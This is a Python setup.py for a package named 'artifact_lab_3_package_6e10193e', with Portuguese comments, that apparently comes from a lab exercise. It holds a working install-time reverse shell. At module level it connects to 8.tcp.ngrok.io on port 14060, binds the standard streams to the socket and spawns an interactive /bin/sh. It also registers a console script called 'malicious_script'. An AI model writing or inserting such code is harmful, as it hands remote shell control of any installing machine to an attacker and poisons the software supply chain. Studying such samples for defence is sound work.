# setup.py
from setuptools import setup, find_packages
import os
import socket
import subprocess

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("8.tcp.ngrok.io", 14060))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Executa durante a instalação
reverse_shell()

setup(
    name="artifact_lab_3_package_6e10193e",
    version="0.3.3",  # Versão atualizada
    packages=find_packages(),
    install_requires=[],
    entry_points={
        'console_scripts': [
            'malicious_script=artifact_lab_3_package_6e10193e.malicious:reverse_shell',
        ],
    },
)

